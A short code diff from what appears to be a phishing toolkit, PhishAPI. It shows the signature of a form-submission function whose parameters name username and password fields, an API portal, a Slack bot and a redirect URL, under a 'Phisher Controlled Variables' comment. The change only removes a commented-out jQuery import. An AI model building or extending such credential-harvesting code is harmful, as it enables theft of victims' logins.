@@ -29,10 +29,6 @@
 
 // Main PhishAPI Form Submission Function
 function SubForm(APIPortal,FormName,Project,SlackBotName,SlackEmoji,UsernameInputID,PasswordInputID,RedirURL,CSRFToken){
-	// Pull in JQuery
-	//var imported = document.createElement('script');
-	//imported.src = 'https://code.jquery.com/jquery-3.4.1.min.js';
-	//document.head.appendChild(imported);
 	
 	// Phisher Controlled Variables
 	var APIPortal = SubForm.arguments[0];
